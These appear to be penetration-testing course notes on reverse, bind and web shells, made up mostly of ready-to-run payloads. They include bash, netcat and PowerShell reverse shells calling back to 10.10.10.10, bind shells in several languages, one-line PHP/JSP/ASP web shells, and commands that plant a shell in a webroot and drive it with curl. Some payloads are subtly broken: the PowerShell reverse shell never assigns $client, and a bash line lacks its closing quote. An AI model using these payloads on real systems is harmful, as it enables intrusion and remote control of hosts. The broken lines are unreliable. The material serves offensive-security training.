# Types of Shells

| Type of Shell | Method of Communication |
| --- | --- |
| Reverse Shell | Connects back to our system and gives control through a reverse connection | 
| Bind Shell | Waits for us to connect to it and gives us control once we do |
| Web Shell | Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output |

## Reverse Shell

The most common type of shell; quickest and easiest method to obtain control over a compromised host.

* Identify vulnerability that allows remote code execution
* Start a netcat listener on our machine
* Execute a reverse shell command that connects the remote systems shell

### Netcat Listener
```bash
nc -nvlp 1234
```
### Connect Back IP
```bash
ip a
```
### Reverse Shell Command
Command executed depends on the operating system the compromised host runs on.

[Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

**Reliable reverse shell Commands:**
#### bash
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1
```
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```
#### powershell
```powershell
powershell -NoP -NonI - W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
## Bind Shell
Unlike a Reverse Shell, will connect to it on the *target's* listening port.
### Bind Shell Commmand
Can again utilize [Payload All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md) to find the proper command.

> Will start the listening connection on port '1234' on the remote host, with IP '0.0.0.0' so that we can connect to it from anywhere

#### bash
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```
#### python
```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```
#### powershell
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```
### Netcat Connection
```bash
nc 10.10.10.1 1234
```
## Upgrading TTY
Map terminal TTY with the remote TTY.

Using the `python/stty` method:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
* Next, background shell with <kbd>Ctrl+Z</kbd>
* Input the following `stty` command:
```bash
www-data@remotehost$ ^Z

Daniel Freeman@htb[/htb]$ stty raw -echo
Daniel Freeman@htb[/htb]$ fg

[Enter]
[Enter]
www-data@remotehost$
```
* Once `fg` is hit, it will bring back our netcat shell.
* Can hit <kbd>enter</kbd> again to get back or input `reset` and hit enter

Shell may not cover the entire terminal. Input the following to get your terminal variables:
```bash
Daniel Freeman@htb[/htb]$ echo $TERM

xterm-256color
```
```bash
Daniel Freeman@htb[/htb]$ stty size

67 318
```
* First command shows us the `TERM` variable.
* Second shows values for `rows` and `columns`
* Proceed back to netcat shell:
```bash
export TERM=xterm-256color
```
```bash
stty rows 67 columns 318
```
## Web Shells
Typically a web script that accepts our command through HTTP request parameters such as GET and POST.
### Writing a Web Shell
Writing a web shell that will take our commands through a GET request, execute it, and print its output back:
#### php
```php
<?php system($_REQUEST["cmd"]); ?>
```
#### jsp
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
#### asp
```asp
<% eval request("cmd") %>
```
### Uploading a Web Shell
Need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser. Can be done through a vuln in an upload feature.

If we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web.

#### Common Web Server Default Webroots
| Web Server | Default Webroot |
| --- | --- |
| Apache | /var/www/html/ |
| Nginx | /usr/local/nginx/html/ |
| IIS | c:\inetpub\wwwroot\ |
| XAMPP | C:\xampp\htdocs\ |

Check these directories to see which webroot is in use then use `echo` to write out our web shell.

Example on Linux host running Apache (PHP):
```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```
### Accessing Web Shell
Access it through a browser or by using `cURL`.

Visit the shell.php page on the compromised website, and use `?cmd=id` to execute the `id` command.
```html
http://SERVER_IP/shell.php?cmd=id
```
Use `cURL`:
```bash
curl http://SERVER_IP:PORT/shell.php?cmd=id
```

